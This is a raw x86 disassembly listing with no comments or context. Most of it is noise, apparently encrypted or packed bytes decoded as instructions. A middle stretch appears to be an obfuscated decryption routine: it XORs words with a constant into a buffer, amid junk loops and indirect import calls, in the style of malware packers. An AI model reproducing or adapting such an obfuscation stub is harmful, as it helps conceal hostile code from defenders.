  416041:	jp     0x416015
  416043:	int    0xcb
  416045:	bound  edi,QWORD PTR [esi+0x5d]
  416048:	out    dx,eax
  416049:	add    eax,0x72c5f78
  41604e:	ins    DWORD PTR es:[edi],dx
  41604f:	(bad)  
  416050:	hlt    
  416051:	gs addr16 sti 
  416054:	push   ecx
  416055:	popa   
  416056:	sbb    eax,0x75ca484
  41605b:	icebp  
  41605c:	xor    al,0x9a
  41605e:	mov    bl,0xf6
  416060:	sub    ecx,ebp
  416062:	pop    ss
  416063:	sti    
  416064:	xor    BYTE PTR [ecx+ecx*8],cl
  416067:	mov    ecx,DWORD PTR [ebx]
  416069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41606a:	das    
  41606b:	add    esi,DWORD PTR [eax+0x17]
  41606e:	out    dx,eax
  41606f:	(bad)  
  416070:	mov    dh,BYTE PTR [eax-0x11]
  416073:	xchg   edx,eax
  416074:	add    dl,BYTE PTR [ebp-0x30]
  416077:	xchg   BYTE PTR [ebx],ah
  416079:	mov    fs,ebp
  41607b:	jp     0x4160ef
  41607d:	out    dx,al
  41607e:	inc    esp
  41607f:	jmp    0xfc72ce6b
  416084:	cwde   
  416085:	arpl   WORD PTR [ebx-0x7b1bb7e],ax
  41608b:	or     DWORD PTR [ecx],0xffffffa7
  41608e:	shl    cl,0x35
  416091:	inc    bx
  416093:	aad    0x3b
  416095:	jae    0x416035
  416097:	es pop edx
  416099:	shrd   DWORD PTR ds:0xfab80bee,eax,0x3d
  4160a1:	ins    DWORD PTR es:[edi],dx
  4160a2:	imul   BYTE PTR [ebx]
  4160a4:	cs jbe 0x416097
  4160a7:	outs   dx,DWORD PTR ds:[esi]
  4160a8:	cmp    ebp,DWORD PTR [eax]
  4160aa:	fs aam 0xfe
  4160ad:	enter  0xa1b3,0x3c
  4160b1:	cs xchg esi,eax
  4160b3:	xor    DWORD PTR [edi],esp
  4160b5:	call   0x3210:0xc0cd8bb0
  4160bc:	adc    DWORD PTR [edx-0x4640132b],ecx
  4160c2:	sub    BYTE PTR [edx-0x3f],dh
  4160c5:	push   eax
  4160c6:	sub    eax,0xf1eccac1
  4160cb:	pop    ebp
  4160cc:	fstp   DWORD PTR [edi-0x3a663ec7]
  4160d2:	fcomp  DWORD PTR [edi]
  4160d4:	add    esi,DWORD PTR [ecx-0x32]
  4160d7:	aaa    
  4160d8:	sub    dl,cl
  4160da:	or     al,0xf9
  4160dc:	add    BYTE PTR [ebx+edi*8-0x3e2aa9aa],0x4b
  4160e4:	push   es
  4160e5:	mov    ah,BYTE PTR [edx+0x736a86cc]
  4160eb:	push   esp
  4160ec:	sub    BYTE PTR [edx-0x87b461c],0xb9
  4160f3:	dec    esp
  4160f4:	cmp    eax,0x101ffbc2
  4160f9:	(bad)  
  4160fb:	xor    cl,bh
  4160fd:	out    0x1a,al
  4160ff:	cdq    
  416100:	push   edi
  416101:	xor    bl,al
  416103:	(bad)  
  416104:	idiv   DWORD PTR [edi-0x7c78b8ae]
  41610a:	xor    DWORD PTR [edi],esi
  41610c:	mov    esi,0x69d45559
  416111:	xchg   BYTE PTR [ecx+edx*1-0x7a2e7256],al
  416118:	jae    0x416132
  41611a:	xor    BYTE PTR [eax-0x3d298ddf],dh
  416120:	arpl   WORD PTR [edx-0x1adac1ed],bx
  416126:	adc    cx,WORD PTR [ebx]
  416129:	cdq    
  41612a:	adc    ah,al
  41612c:	mov    eax,ds:0x9a791308
  416131:	aad    0xe6
  416133:	xor    edx,DWORD PTR [edi-0x4]
  416136:	mov    al,0x10
  416138:	shl    DWORD PTR [edx-0x5062c988],0x7d
  41613f:	repz (bad) 
  416141:	mov    ds:0xe373158c,al
  416146:	in     al,dx
  416147:	imul   BYTE PTR [edi]
  416149:	ret    0x9096
  41614c:	mov    ecx,0x12a85879
  416151:	cmovge edx,DWORD PTR [ebp+0x5162c99c]
  416158:	inc    eax
  416159:	mov    dl,0xd8
  41615b:	fldcw  WORD PTR [ebx+0x25d6ad4f]
  416161:	ins    BYTE PTR es:[edi],dx
  416162:	mov    ecx,0x830b4f27
  416167:	out    0x67,eax
  416169:	pop    edi
  41616a:	mov    edi,0xbaf922c8
  41616f:	sbb    edi,DWORD PTR [ebx-0x6e024536]
  416175:	daa    
  416176:	adc    eax,0x1a025290
  41617b:	xchg   esp,eax
  41617c:	adc    eax,0x9beae168
  416181:	das    
  416182:	test   DWORD PTR [edx-0x31],0xba8ec40
  416189:	sbb    al,0xf5
  41618b:	mov    al,0x77
  41618d:	sub    ebp,DWORD PTR [ecx+eiz*8]
  416190:	sahf   
  416191:	xor    dl,BYTE PTR [esi]
  416193:	lea    ecx,[eax+ebp*2+0x67a80639]
  41619a:	mov    ch,0xea
  41619c:	mov    dh,0xb6
  41619e:	cli    
  41619f:	xor    edi,DWORD PTR [edi-0x4c5a7bca]
  4161a5:	xor    dh,BYTE PTR [ebp-0x6]
  4161a8:	icebp  
  4161a9:	mov    al,ds:0x3a6016a5
  4161ae:	pop    eax
  4161af:	daa    
  4161b0:	inc    esi
  4161b1:	jmp    0x8da36393
  4161b6:	add    al,0xea
  4161b8:	or     edi,ecx
  4161ba:	aaa    
  4161bb:	sti    
  4161bc:	out    0x78,al
  4161be:	mov    eax,0x100eef30
  4161c3:	sub    DWORD PTR [edi+0x38],ebp
  4161c6:	in     al,0xde
  4161c8:	shr    DWORD PTR [ebp+0x5beb8133],0xa3
  4161cf:	ins    DWORD PTR es:[edi],dx
  4161d0:	dec    edx
  4161d1:	stc    
  4161d2:	lds    ebp,FWORD PTR [edi]
  4161d4:	and    al,0x92
  4161d6:	stos   BYTE PTR es:[edi],al
  4161d7:	popf   
  4161d8:	push   ebp
  4161d9:	mov    esp,esp
  4161db:	cmc    
  4161dc:	or     bh,BYTE PTR [esi+eax*2+0x31]
  4161e0:	inc    edi
  4161e1:	mov    ebp,0xd557f5c9
  4161e6:	push   0xd4839ead
  4161eb:	pop    ebx
  4161ec:	lahf   
  4161ed:	inc    eax
  4161ee:	add    dl,dh
  4161f0:	nop
  4161f1:	jo     0x41623d
  4161f3:	ja     0x4161a3
  4161f5:	retf   
  4161f6:	int    0x11
  4161f8:	lds    edi,FWORD PTR [esi]
  4161fa:	or     BYTE PTR [esi+esi*2-0x4cc76b11],bh
  416201:	test   eax,esp
  416203:	mov    BYTE PTR [ebp+esi*1+0x63],dh
  416207:	test   al,0x28
  416209:	sti    
  41620a:	add    edx,DWORD PTR [eax+0x37]
  41620d:	adc    al,0xbf
  41620f:	mov    ah,0xdd
  416211:	aad    0x4e
  416213:	jg     0x4161e0
  416215:	xlat   BYTE PTR ds:[ebx]
  416216:	leave  
  416217:	and    BYTE PTR [edx-0x21],0x42
  41621b:	aaa    
  41621c:	or     dh,BYTE PTR [edi+0x50fe094c]
  416222:	or     DWORD PTR [ebx-0x3d36a187],eax
  416228:	sbb    BYTE PTR [eax],al
  41622a:	push   ebp
  41622b:	mov    ebp,esp
  41622d:	sub    esp,0x9c
  416233:	or     ecx,eax
  416235:	mov    ecx,DWORD PTR [ebp+0x8]
  416238:	adc    DWORD PTR ds:0x42a29e,0x5466
  416242:	mov    eax,0x8a98
  416247:	xor    ax,WORD PTR [ecx+0x20]
  41624b:	and    DWORD PTR ds:0x42a2d6,0x0
  416255:	jmp    0x416267
  41625a:	mov    ecx,DWORD PTR ds:0x42a2d6
  416260:	inc    ecx
  416261:	mov    DWORD PTR ds:0x42a2d6,ecx
  416267:	cmp    DWORD PTR ds:0x42a2d6,0x12
  41626e:	jae    0x4162bb
  416274:	cmp    DWORD PTR ds:0x42a2d6,0xa
  41627b:	jle    0x4162bb
  416281:	jmp    0x41629c
  416286:	push   0x5de0
  41628b:	push   0x42a26a
  416290:	push   DWORD PTR [ebp-0x28]
  416293:	push   DWORD PTR [ebp-0x10]
  416296:	call   DWORD PTR ds:0x42a3d2
  41629c:	cmp    DWORD PTR ds:0x42a2d6,0x9
  4162a3:	jne    0x4162b6
  4162a9:	mov    ecx,DWORD PTR ds:0x42a2d6
  4162af:	inc    ecx
  4162b0:	mov    DWORD PTR ds:0x42a2d6,ecx
  4162b6:	jmp    0x41625a
  4162bb:	mov    ecx,0x3b5a
  4162c0:	add    DWORD PTR ds:0x42a292,0x71f8
  4162ca:	add    ax,cx
  4162cd:	sbb    ecx,DWORD PTR ds:0x42a2d6
  4162d3:	movzx  eax,ax
  4162d6:	sbb    ecx,DWORD PTR ds:0x42a29a
  4162dc:	mov    DWORD PTR [ebp-0x10],eax
  4162df:	mov    BYTE PTR [ebp-0x1],0x7c
  4162e3:	and    DWORD PTR ds:0x42a2a2,ecx
  4162e9:	lea    eax,[ebp-0x1]
  4162ec:	mov    DWORD PTR [ebp-0xc],eax
  4162ef:	and    DWORD PTR ds:0x42a2be,0x0
  4162f9:	mov    ecx,DWORD PTR ds:0x42a2be
  4162ff:	inc    ecx
  416300:	mov    DWORD PTR ds:0x42a2be,ecx
  416306:	cmp    DWORD PTR ds:0x42a2be,0x25
  41630d:	jg     0x416346
  416313:	jmp    0x416339
  416318:	push   DWORD PTR [ebp-0x28]
  41631b:	push   0x5043
  416320:	push   DWORD PTR [ebp-0x18]
  416323:	push   DWORD PTR [ebp-0xc]
  416326:	push   DWORD PTR [ebp-0x1c]
  416329:	push   0x5d36
  41632e:	push   0x429153
  416333:	call   DWORD PTR ds:0x42a3d6
  416339:	cmp    DWORD PTR ds:0x42a2be,0x1a
  416340:	jb     0x4162f9
  416346:	mov    al,BYTE PTR [ebp-0x1]
  416349:	and    DWORD PTR ds:0x42a26e,0x0
  416353:	mov    ecx,DWORD PTR ds:0x42a26e
  416359:	inc    ecx
  41635a:	mov    DWORD PTR ds:0x42a26e,ecx
  416360:	cmp    DWORD PTR ds:0x42a26e,0x19
  416367:	jge    0x416385
  41636d:	jmp    0x416378
  416372:	call   DWORD PTR ds:0x42a3da
  416378:	cmp    DWORD PTR ds:0x42a26e,0x10
  41637f:	jb     0x416353
  416385:	mov    ecx,DWORD PTR [ebp-0xc]
  416388:	xor    al,0x7c
  41638a:	mov    DWORD PTR ds:0x42a2c6,0x2666
  416394:	inc    al
  416396:	and    DWORD PTR ds:0x42a2ce,0x42a28a
  4163a0:	mov    BYTE PTR [ecx],al
  4163a2:	sbb    DWORD PTR ds:0x42a2f6,0x5717
  4163ac:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  4163b3:	push   ebx
  4163b4:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  4163bb:	mov    DWORD PTR ds:0x42a2f6,0x16
  4163c5:	cmp    DWORD PTR ds:0x42a2f6,0x0
  4163cc:	je     0x41640c
  4163d2:	cmp    DWORD PTR ds:0x42a2f6,0x1e
  4163d9:	jb     0x41640c
  4163df:	jmp    0x4163fc
  4163e4:	push   0x8db9
  4163e9:	push   DWORD PTR [ebp-0x1c]
  4163ec:	push   0x6bac
  4163f1:	push   0x6e74
  4163f6:	call   DWORD PTR ds:0x42a3de
  4163fc:	mov    eax,ds:0x42a2f6
  416401:	dec    eax
  416402:	mov    ds:0x42a2f6,eax
  416407:	jmp    0x4163c5
  41640c:	mov    ecx,DWORD PTR [ebp-0x18]
  41640f:	push   esi
  416410:	or     DWORD PTR ds:0x42a286,0x93e
  41641a:	mov    eax,0x75108aa
  41641f:	and    DWORD PTR ds:0x42a2e2,0x0
  416429:	jmp    0x41643d
  41642e:	xor    esi,esi
  416430:	add    esi,DWORD PTR ds:0x42a2e2
  416436:	inc    esi
  416437:	mov    DWORD PTR ds:0x42a2e2,esi
  41643d:	cmp    DWORD PTR ds:0x42a2e2,0x17
  416444:	jae    0x416481
  41644a:	cmp    DWORD PTR ds:0x42a2e2,0xa
  416451:	jl     0x416481
  416457:	jmp    0x416462
  41645c:	call   DWORD PTR ds:0x42a3e2
  416462:	cmp    DWORD PTR ds:0x42a2e2,0x9
  416469:	jne    0x41647c
  41646f:	mov    esi,DWORD PTR ds:0x42a2e2
  416475:	inc    esi
  416476:	mov    DWORD PTR ds:0x42a2e2,esi
  41647c:	jmp    0x41642e
  416481:	xor    ecx,eax
  416483:	mov    esi,DWORD PTR ds:0x42a2ae
  416489:	sbb    esi,DWORD PTR ds:0x42a25a
  41648f:	mov    DWORD PTR ds:0x42a2ae,esi
  416495:	mov    esi,0x3272f1
  41649a:	push   edi
  41649b:	add    ecx,esi
  41649d:	jmp    0x4164b3
  4164a2:	inc    DWORD PTR ds:0x42a26e
  4164a8:	mov    dl,BYTE PTR [ebp-0x1]
  4164ab:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  4164b2:	inc    ecx
  4164b3:	mov    DWORD PTR ds:0x42a286,0x7bd4
  4164bd:	cmp    ecx,0x40
  4164c0:	jb     0x4164a2
  4164c6:	not    edx
  4164c8:	mov    edx,DWORD PTR [ebp-0x18]
  4164cb:	xor    edx,eax
  4164cd:	mov    DWORD PTR ds:0x42a302,0x3db0
  4164d7:	add    edx,esi
  4164d9:	jmp    0x416628
  4164de:	movzx  edi,WORD PTR ds:0x42a296
  4164e5:	or     DWORD PTR ds:0x42a262,edi
  4164eb:	mov    edi,DWORD PTR [ebp+0x8]
  4164ee:	adc    DWORD PTR ds:0x42a286,edx
  4164f4:	mov    ecx,0x8a98
  4164f9:	adc    DWORD PTR ds:0x42a2fe,0x3816
  416503:	xor    cx,WORD PTR [edi+edx*4+0x2]
  416508:	and    DWORD PTR ds:0x42a2ae,0x0
  416512:	jmp    0x416524
  416517:	mov    edi,DWORD PTR ds:0x42a2ae
  41651d:	inc    edi
  41651e:	mov    DWORD PTR ds:0x42a2ae,edi
  416524:	cmp    DWORD PTR ds:0x42a2ae,0x1f
  41652b:	jae    0x41657e
  416531:	cmp    DWORD PTR ds:0x42a2ae,0xa
  416538:	jbe    0x41657e
  41653e:	jmp    0x41655d
  416543:	push   0x42a25e
  416548:	push   0x6fb7
  41654d:	push   0x429009
  416552:	push   0x4290e8
  416557:	call   DWORD PTR ds:0x42a3ea
  41655d:	cmp    DWORD PTR ds:0x42a2ae,0x9
  416564:	jne    0x416579
  41656a:	xor    edi,edi
  41656c:	xor    edi,DWORD PTR ds:0x42a2ae
  416572:	inc    edi
  416573:	mov    DWORD PTR ds:0x42a2ae,edi
  416579:	jmp    0x416517
  41657e:	mov    edi,0x3b5a
  416583:	add    DWORD PTR ds:0x42a2fa,0x42a2c2
  41658d:	add    cx,di
  416590:	sbb    DWORD PTR ds:0x42a256,0x16d8
  41659a:	movzx  ecx,cx
  41659d:	and    DWORD PTR ds:0x42a2a2,0x42a29a
  4165a7:	mov    DWORD PTR [ebp-0xc],ecx
  4165aa:	and    DWORD PTR ds:0x42a26e,0x0
  4165b4:	xor    ecx,ecx
  4165b6:	xor    ecx,DWORD PTR ds:0x42a26e
  4165bc:	inc    ecx
  4165bd:	mov    DWORD PTR ds:0x42a26e,ecx
  4165c3:	cmp    DWORD PTR ds:0x42a26e,0x19
  4165ca:	jle    0x4165f5
  4165d0:	jmp    0x4165e8
  4165d5:	push   0x594c
  4165da:	push   0x42a276
  4165df:	push   DWORD PTR [ebp-0x1c]
  4165e2:	call   DWORD PTR ds:0x42a3ee
  4165e8:	cmp    DWORD PTR ds:0x42a26e,0x17
  4165ef:	jb     0x4165b4
  4165f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4165f8:	mov    DWORD PTR ds:0x42a29a,0x62ed
  416602:	movzx  ecx,WORD PTR [ecx+edx*4]
  416606:	xor    ecx,0x8a98
  41660c:	add    ecx,edi
  41660e:	mov    DWORD PTR ds:0x42a302,0x1620
  416618:	mov    edi,DWORD PTR [ebp-0xc]
  41661b:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416622:	mov    ecx,0x8de
  416627:	inc    edx
  416628:	mov    ecx,DWORD PTR [ebp-0x10]
  41662b:	mov    DWORD PTR ds:0x42a25a,0x2d30
  416635:	cmp    edx,ecx
  416637:	jne    0x4164de
  41663d:	and    edx,edx
  41663f:	mov    ecx,DWORD PTR [ebp-0x18]
  416642:	sub    edi,DWORD PTR ds:0x42a25a
  416648:	mov    edx,DWORD PTR [ebp+0x10]
  41664b:	xor    DWORD PTR ds:0x42a2ca,0xf9d
  416655:	xor    ecx,eax
  416657:	and    DWORD PTR ds:0x42a2c2,ebx
  41665d:	add    ecx,esi
  41665f:	mov    DWORD PTR [edx],ecx
  416661:	mov    ecx,DWORD PTR [ebp-0x18]
  416664:	sbb    DWORD PTR ds:0x42a2aa,0x1e81
  41666e:	jmp    0x4189c6
  416673:	mov    dl,0x1f
  416675:	xlat   BYTE PTR ds:[ebx]
  416676:	and    edx,edx
  416678:	mov    eax,ds:0xbec98882
  41667d:	js     0x4166c3
  41667f:	add    DWORD PTR [edx],edx
  416681:	ins    DWORD PTR es:[edi],dx
  416682:	(bad)  
  416683:	cld    
  416684:	inc    ecx
  416685:	jl     0x41660a
  416687:	inc    esi
  416688:	pop    esi
  416689:	add    DWORD PTR [ebx-0x1914adb4],0x4a
  416690:	shr    DWORD PTR [ebx+0x70aa3c86],0x93
  416697:	push   cs
  416698:	enter  0x2ad6,0xb4
  41669c:	add    al,0xd9
  41669e:	adc    dl,BYTE PTR [eax-0x5c0b4c65]
  4166a4:	dec    esp
  4166a5:	jo     0x4166d0
  4166a7:	cmp    bh,bl
  4166a9:	mov    ch,0x79
  4166ab:	mov    dh,0xdd
  4166ad:	xor    al,0xb2
  4166af:	xchg   esp,eax
  4166b0:	jae    0x41663c
  4166b2:	clc    
  4166b3:	mov    es,WORD PTR [esi]
  4166b5:	sub    eax,0x4ed0647
  4166ba:	jnp    0x416690
  4166bc:	sti    
  4166bd:	(bad)  
  4166bf:	outs   dx,BYTE PTR ds:[esi]
  4166c0:	in     al,0xfb
  4166c2:	aad    0x3f
  4166c4:	arpl   WORD PTR [ecx],di
  4166c6:	hlt    
  4166c7:	pushf  
  4166c8:	aaa    
  4166c9:	adc    BYTE PTR [ebx+0x425e1089],al
  4166cf:	jge    0x4166a6
  4166d1:	mov    esi,0x1d70995b
  4166d6:	xor    cl,BYTE PTR ds:0xd194cac
  4166dc:	jno    0x4166f0
  4166de:	xor    DWORD PTR [ebx+0x39e734],edi
  4166e4:	push   esp
  4166e5:	in     al,0xa7
  4166e7:	push   cs
  4166e8:	mov    BYTE PTR [ebx+0x7c],ch
  4166eb:	cld    
  4166ec:	fs arpl di,bp
  4166ef:	jbe    0x416699
  4166f1:	xchg   edx,eax
  4166f2:	imul   esp,DWORD PTR [ecx],0xe
  4166f5:	neg    DWORD PTR [ebp+esi*2+0x55]
  4166f9:	mov    bh,0xb3
  4166fb:	(bad)  
  4166fc:	fs and eax,0x90348031
  416702:	or     eax,0x4c176f42
  416707:	or     DWORD PTR [edi+0x66440723],0x4f
  41670e:	ret    
  41670f:	xor    DWORD PTR [eax+ebp*2+0x3bc9f579],esi
  416716:	mov    esp,0xf038d7c4
  41671b:	pop    ecx
  41671c:	nop
  41671d:	mov    eax,0x3a30b5f
  416722:	pop    esp
  416723:	clc    
  416724:	add    cl,BYTE PTR [eax]
  416726:	xchg   esp,eax
  416727:	ret    0xef5f
  41672a:	xlat   BYTE PTR ds:[ebx]
  41672b:	fs fadd st,st(2)
  41672e:	adc    ah,BYTE PTR [edx-0xe]
  416731:	mov    eax,0x5bd99147
  416736:	sti    
  416737:	adc    al,0x64
  416739:	paddsw mm5,QWORD PTR [edx]
  41673c:	fnstsw WORD PTR [esi+0x65]
  41673f:	adc    al,0x8f
  416741:	(bad)  
  416742:	add    al,0xfe
  416744:	xchg   edx,eax
  416745:	pop    edi
  416746:	dec    eax
  416747:	jecxz  0x416730
  416749:	dec    esp
  41674a:	data16 shl BYTE PTR [eax],cl
  41674d:	cwde   
  41674e:	push   0xb27b2845
  416753:	mov    eax,0xbaaeda27
  416758:	sbb    al,0x77
  41675a:	and    DWORD PTR [di-0x4a62],edx
  41675f:	std    
  416760:	cmp    eax,0xa759c81b
  416765:	pop    ebp
  416766:	jns    0x416746
  416768:	xchg   edx,eax
  416769:	inc    esi
  41676a:	xor    dh,BYTE PTR [eax+0x4b]
  41676d:	inc    ecx
  41676e:	xor    ecx,DWORD PTR [edx]
  416770:	ret    
  416771:	ret    0x7162
  416774:	imul   eax,DWORD PTR [edx],0xffffffaf
  416777:	xchg   ebp,eax
  416778:	lea    esp,[edx]
  41677a:	mov    ch,0x35
  41677c:	add    al,0xec
  41677e:	mov    esi,DWORD PTR [edx]
  416780:	adc    ah,dh
  416782:	test   DWORD PTR [eax],edx
  416784:	dec    edi
  416785:	mov    ?,WORD PTR [ecx]
  416787:	mov    bh,0xfa
  416789:	ds int3 
  41678b:	jo     0x416775
  41678d:	pop    esp
  41678e:	clc    
  41678f:	mov    al,ah
  416791:	push   eax
  416792:	xor    edi,DWORD PTR [eax+0x4235b69d]
  416798:	dec    ebx
  416799:	ret    
  41679a:	sti    
  41679b:	ins    DWORD PTR es:[edi],dx
  41679c:	shr    DWORD PTR [esi],cl
  41679e:	xor    al,0xef
  4167a0:	inc    esp
  4167a1:	sbb    DWORD PTR [esi+0x4b],edi
  4167a4:	and    DWORD PTR es:[ecx],ebp
  4167a7:	jae    0x4167f5
  4167a9:	test   BYTE PTR [edi-0x5d78e71f],ch
  4167af:	inc    edi
  4167b0:	mov    esp,0xa45000ae
  4167b5:	adc    dl,cl
  4167b7:	xchg   edi,eax
  4167b8:	lock fldcw WORD PTR [di]
  4167bc:	repnz adc bl,cl
  4167bf:	push   ebx
  4167c0:	cs mov edi,0x7a6a8f7
  4167c6:	je     0x4167ba
  4167c8:	ja     0x4167a2
  4167ca:	sub    ebx,0xd0c4abdc
  4167d0:	xchg   ebx,eax
  4167d1:	inc    esp
  4167d2:	add    eax,0xdda391db
  4167d7:	push   ss
  4167d8:	xchg   ecx,eax
  4167d9:	repz cmp eax,0x48316e4d
  4167df:	jno    0x4167d0
  4167e1:	add    esi,DWORD PTR [edi]
  4167e3:	fwait
  4167e4:	in     eax,dx
  4167e5:	popa   
  4167e6:	mov    dh,0x92
  4167e8:	dec    DWORD PTR [edx+ecx*2+0x1639bcbb]
  4167ef:	sbb    ch,BYTE PTR [ebx*1+0x2faab106]
  4167f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f7:	jecxz  0x41679c
  4167f9:	pop    ds
  4167fa:	(bad)  
  4167fb:	pop    ebx
  4167fc:	xor    BYTE PTR [ecx],cl
  4167fe:	aad    0x5f
  416800:	test   BYTE PTR [esp+esi*8],0x54
  416804:	xchg   ebx,edx
  416806:	xor    eax,0xa503cd5d
  41680b:	push   ebp
  41680c:	imul   ecx,DWORD PTR [ebx+edx*1-0x2e],0xb6cb082f
  416814:	out    dx,eax
  416815:	call   0x4f5:0xfeebf511
  41681c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41681d:	dec    eax
  41681e:	sbb    edi,esi
  416820:	inc    edi
  416821:	xchg   esp,eax
  416822:	push   eax
  416823:	js     0x41687d
  416825:	mov    ch,ah
  416827:	imul   edi,DWORD PTR ds:[ebx-0x75],0x3961ca2d
  41682f:	adc    DWORD PTR [ebp-0x44],0x27c1cde3
  416836:	sub    eax,0x5e41d5f3
  41683b:	mov    dh,0xe9
  41683d:	stc    
  41683e:	inc    ebx
  41683f:	gs jecxz 0x4167c2
  416842:	pop    esp
  416843:	dec    ecx
  416844:	outs   dx,BYTE PTR ds:[esi]
  416845:	enter  0x3b2e,0x88
  416849:	clc    
  41684a:	jl     0x4168b1
  41684c:	push   ecx
  41684d:	sbb    BYTE PTR [ebx-0x1e9c71a3],ah
  416853:	out    dx,eax
  416854:	mov    ds:0xfb35a849,al
  416859:	cdq    
  41685a:	mov    ds:0x3e11772,al
  41685f:	mov    esi,0x557c7088
  416864:	mov    ds:0xb96a7dab,al
  416869:	outs   dx,DWORD PTR ds:[esi]
  41686a:	pandn  mm2,mm0
  41686d:	or     eax,esi
  41686f:	jne    0x4168c7
  416871:	shr    ebx,1
  416873:	xchg   BYTE PTR [ecx-0x27ad2d2b],ch
  416879:	pop    eax
  41687a:	inc    ebp
  41687b:	sti    
  41687c:	mov    eax,ds:0xadf53131
  416881:	gs mov ecx,0x6d29501b
  416887:	aad    0x0
  416889:	lea    ebp,[ebp-0x7b]
  41688c:	nop
  41688d:	enter  0x4109,0xdd
  416891:	imul   esi,DWORD PTR [edx-0x3d1ef96],0x8aedaeac
  41689b:	or     dl,0x7d
  41689e:	adc    dl,BYTE PTR [eax+eax*2-0x23c695b4]
  4168a5:	mov    eax,ds:0x9ecef7d9
  4168aa:	aas    
  4168ab:	out    dx,eax
  4168ac:	mov    ebp,0xd0a39fbd
  4168b1:	jns    0x416846
  4168b3:	jl     0x416888
  4168b5:	add    BYTE PTR [edx],bl
  4168b7:	ficomp DWORD PTR [ecx+0x72]
  4168ba:	int3   
  4168bb:	push   esi
  4168bc:	retf   0x35d8
  4168bf:	add    al,0x6d
  4168c1:	inc    edx
  4168c2:	(bad)  
  4168c3:	test   DWORD PTR [eax-0x7b],ebx
  4168c6:	push   0xffffffdd
  4168c8:	mov    edx,0x8d04118b
  4168cd:	cdq    
  4168ce:	ret    0xae96
  4168d1:	fiadd  WORD PTR [esi-0x57]
  4168d4:	ss push eax
  4168d6:	loop   0x416936
  4168d8:	inc    ecx
  4168d9:	call   0x1bc:0x60b6dc2f
  4168e0:	sub    BYTE PTR ss:[esi],ah
  4168e3:	out    dx,al
  4168e4:	inc    edi
  4168e5:	pop    esi
  4168e6:	into   
  4168e7:	mov    dh,0xc1
  4168e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168ea:	xchg   edx,edx
  4168ec:	in     al,dx
  4168ed:	xchg   edx,eax
  4168ee:	add    ebp,DWORD PTR [ebx+ebx*1-0x3b]
  4168f2:	add    BYTE PTR [ebp-0x1ac0dd2b],cl
  4168f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168f9:	dec    esp
  4168fa:	loopne 0x4168ef
  4168fc:	pop    ebx
  4168fd:	add    eax,0xf8422d96
  416902:	cmp    DWORD PTR [ebx-0x69],edx
  416905:	pushf  
  416906:	xor    DWORD PTR [esi+esi*1],0xffffffda
  41690a:	push   es
  41690b:	data16 lock mov ch,0xe2
  41690f:	cld    
  416910:	or     eax,0xbb0af812
  416915:	sub    DWORD PTR [eax],0x62
  416918:	stos   BYTE PTR es:[edi],al
  416919:	jge    0x416956
  41691b:	into   
  41691c:	mov    cl,0xe7
  41691e:	outs   dx,DWORD PTR ds:[esi]
  41691f:	(bad)  
  416920:	jp     0x4168b2
  416922:	or     BYTE PTR [ecx+0x3f9f1c50],bh
  416928:	out    dx,eax
  416929:	dec    ebp
  41692a:	mov    ebp,0xaf9583e6
  41692f:	mov    eax,ds:0xeb803b8d
  416934:	jmp    0xb5a233e2
  416939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41693a:	call   0xcd04789
  41693f:	call   0x3f0435f2
  416944:	loop   0x4169ac
  416946:	scas   al,BYTE PTR es:[edi]
  416947:	mov    edx,0x34441ed4
  41694c:	or     eax,0x7b051afb
  416951:	popf   
  416952:	xor    esi,DWORD PTR fs:[esi+ebx*8+0x4f]
  416957:	sbb    ebp,DWORD PTR [ecx]
  416959:	adc    al,0x86
  41695b:	xor    eax,0xe2bee9fb
  416960:	je     0x41696b
  416962:	add    eax,0xba5ec1b4
  416967:	add    ebp,DWORD PTR [edi]
  416969:	sub    BYTE PTR [ebx+0x6],cl
  41696c:	dec    ebx
  41696d:	add    BYTE PTR [edx-0x2d],0x8d
  416971:	mov    dh,0xdf
  416973:	mov    edi,0x9bc70dc9
  416978:	and    BYTE PTR [ecx],al
  41697a:	lods   al,BYTE PTR ds:[esi]
  41697b:	xor    ch,BYTE PTR [ecx+ecx*2]
  41697e:	push   ebp
  41697f:	cs jmp 0x4169ad
  416982:	loop   0x41691f
  416984:	popa   
  416985:	lahf   
  416986:	lods   eax,DWORD PTR ds:[esi]
  416987:	pusha  
  416988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416989:	adc    eax,0x65a2c81d
  41698e:	dec    edx
  41698f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416990:	fbstp  TBYTE PTR [eax]
  416992:	xor    DWORD PTR [esi-0x7ba591f5],0x23f338f9
  41699c:	ret    0xcb56
  41699f:	sahf   
  4169a0:	loope  0x4169c1
  4169a2:	fnstsw WORD PTR [ecx+0x62fb9bd4]
  4169a8:	push   edi
  4169a9:	das    
  4169aa:	ja     0x41697b
  4169ac:	jo     0x416986
  4169ae:	add    bl,dh
  4169b0:	push   ecx
  4169b1:	lahf   
  4169b2:	jg     0x41695e
  4169b4:	push   esi
  4169b5:	(bad)  
  4169b6:	xor    eax,0xef286a23
  4169bb:	xchg   esi,eax
  4169bc:	into   
  4169bd:	in     al,dx
  4169be:	jmp    0xb755a968
  4169c3:	icebp  
  4169c4:	stc    
  4169c5:	fsub   st(0),st
  4169c7:	dec    esp
  4169c8:	(bad)  
  4169ca:	xchg   DWORD PTR [esi],ebp
  4169cc:	xchg   BYTE PTR ds:0xe37a1119,cl
  4169d2:	not    BYTE PTR [edi+ebp*1-0x595b8066]
  4169d9:	sub    edx,DWORD PTR [ebx+0x59978e76]
  4169df:	push   ebx
  4169e0:	mov    ah,0x2a
  4169e2:	imul   edi,DWORD PTR [ebx+0x3c],0x11
  4169e6:	xor    al,0x46
  4169e8:	shl    ecx,1
  4169ea:	sub    al,0x41
  4169ec:	add    eax,DWORD PTR [ebx]
  4169ee:	leave  
  4169ef:	leave  
  4169f0:	in     eax,0x4c
  4169f2:	les    ebp,FWORD PTR [edx+edi*8]
  4169f5:	int    0xf8
  4169f7:	push   cs
  4169f8:	sub    eax,eax
